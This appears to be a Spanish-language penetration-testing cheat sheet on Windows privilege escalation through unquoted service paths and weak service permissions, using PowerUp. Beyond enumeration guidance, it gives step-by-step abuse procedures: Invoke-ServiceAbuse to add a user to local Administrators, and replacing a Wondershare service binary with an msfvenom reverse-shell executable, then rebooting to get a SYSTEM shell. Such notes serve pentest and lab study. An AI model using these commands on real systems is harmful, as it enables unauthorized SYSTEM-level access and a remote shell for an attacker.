# Unquoted Service Path

Tags: #PrivEsc #UnquotedServicePaath #Windows 

Ejecuta todos los checks de escalación de privilegios locales de PowerSploit/PowerUp. Identifica servicios con rutas sin comillas (Unquoted Service Path), servicios cuya configuración puede ser modificada por el usuario actual (weak service permissions), binarios de servicios reemplazables, tareas programadas mal configuradas, entre otros vectores comunes de privesc en Windows.

- [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)

```powershell 
❯ Invoke-AllChecks
```

```powershell 
❯ Get-WmiObject -Class win32_service | select pathname     
# Consultar vía WMI la clase 'Win32_Service' y te devuelve el 'PathName' de cada servicio, o sea, la ruta del ejecutable que corre cada servicio del sistema


Que buscar:
	- Rutas sin comillas y con espacios
		C:\WebServer\Abyss Web Server\abyssws.exe -service 
	Ya que Windows ejecutará de la siguiente manera:
		C:\WebServer\Abyss.exe
		C:\WebServer\Abyss Web.exe
		C:\WebServer\Abyss Web Server\abyssws.exe


Que no buscar:
	- La ruta de Windows\System32 no es escribible por usuarios normales
		C:\Windows\System32\
	- Las rutas con comillas tampoco son vulnerables 
		"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
```

```powershell 
# Críterios 
Para decidir si una entrada de PowerUp es candidata, fíjate en estos campos:

1. StartName: indica con qué cuenta corre el servicio. LocalSystem es muy privilegiada; si el servicio corre con una cuenta de usuario normal, el impacto puede ser menor.
2. ModifiableFile y ModifiableFilePermissions: muestran qué archivo o carpeta se puede modificar y qué permisos detectó PowerUp. Busca permisos efectivos de escritura, modificación o eliminación que permitan reemplazar el ejecutable. WriteAttributes por sí solo no significa que puedas cambiar su contenido.
3. ModifiableFileIdentityReference: indica a qué usuario o grupo pertenecen esos permisos. Confirma que tu cuenta pertenezca a ese grupo.
4. CanRestart, junto con el estado y tipo de inicio: True indica que podrías reiniciar el servicio directamente. Si es False, revisa si arranca automáticamente o si existe otro modo autorizado de que vuelva a iniciar.
5. Path: confirma cuál es el ejecutable real del servicio. En esta ruta no parece aplicar el caso típico de una ruta sin comillas con espacios.
```

## Caso 1 - AbyssWebServer 

```powershell 
# Buscar servicio clave para escalar con los parámetros adecuados 
	ModifiableFile                  : C:\Abyss Web Server
	ModifiableFileIdentityReference : BULTIN\Users
	StartName                       : LocalSystem
	CanRestart                      : True
	Check                           : Modifiable Service Files
	Check                           : Unquoted Service Paths


---  Hacer el abuso  ---
Paso 1:
❯ Invoke-ServiceAbuse -Name AbyssWebServer -Username 'dominio\usuario'
# Abusa de un servicio con permisos débiles para agregar un usuario al grupo local de administradores. Modifica el binPath del servicio para ejecutar un comando arbitrario como SYSTEM.

Paso 2:
❯ net localgroup Administrators   # Verificar que hemos sido agregado al grupo Administrators 


NOTA:
	- Requiere cerrar sesión y volver a autenticarse para que sean asignados los nuevos permisos en memoria  
```

## Caso 2 -  Wondershare InstallAssist 

```powershell 
# Buscar servicio clave para escalar con los parámetros adecuados 
	ModifiableFile                  : C:\ProgramData\Wondershare\Service\InstallAssistService.exe
	ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
		WriteAttributes <- IMPORTANTE 
	ModifiableFileIdentityReference : Everyone
	StartName                       : LocalSystem
	CanRestart                      : False  (Lo ideal es que sea True)
	Check                           : Modifiable Service Files


NOTA:
	- Si el parámetro 'CanRestart = False' y el usuario actual tiene el privilegio de 'SeShutdownPrivilege' puede apagar el equipo pero se necesita que el servicio haga un 'Auto Start' para obtener la revershell 


Paso 1:
# Enumeración del servicio candidato 
❯ sc.exe qc "Wondershare InstallAssist" 
# Muestra la configuración del servicio, como la ruta del ejecutable, el tipo de inicio y la cuenta con la que corre.
	Resultado: 
	# STAR_TYPE : AUTO_START    # Quiere decir que hace un 'Auto_Start'

(Opcional)
❯ sc.exe start "Wondershare InstallAssist"
# Intenta iniciar el servicio. Este sí cambia el estado del sistema y puede fallar si tu cuenta no tiene permiso para iniciarlo.



---  Hacer el abuso  ---
Paso 2:
# Hacer backup del servicio en Windows 
❯ move C:\ProgramData\Wondershare\Service\InstallAssistService.exe C:\ProgramData\Wondershare\Service\InstallAssistService.exe.bak

Paso 3:
# Verificar que ya no existe el servicio en Windows 
❯ icacls C:\ProgramData\Wondershare\Service\InstallAssistService.exe
```

```powershell
Paso 4: Desde Kali 
# Crear un .exe con Msfvenom para despues subirlo y agregarlo al path: "C:\ProgramData\Wondershare\Service\" con el mismo nombre del original 
❯ msfvenom -p windows/shell_reverse_tcp -a x64 --platform windows LHOST=eth0 LPORT=443 -f exe > InstallAssistService.exe
```

```powershell 
Paso 5:
# Dentro del server mover el archivo malicioso al directorio 
❯ move InstallAssistService.exe C:\ProgramData\Wondershare\Service\ 

❯ sc.exe query "Wondershare InstallAssist"
# Muestra el estado actual del servicio, por ejemplo, si se está ejecutando o esta detenido
	Resultado:
	# STATE : RUNNING 

Paso 6:
❯ Restart-Computer   # Reiniciar la computadora para que inicie el servicio y se obtenga la Revershell 
```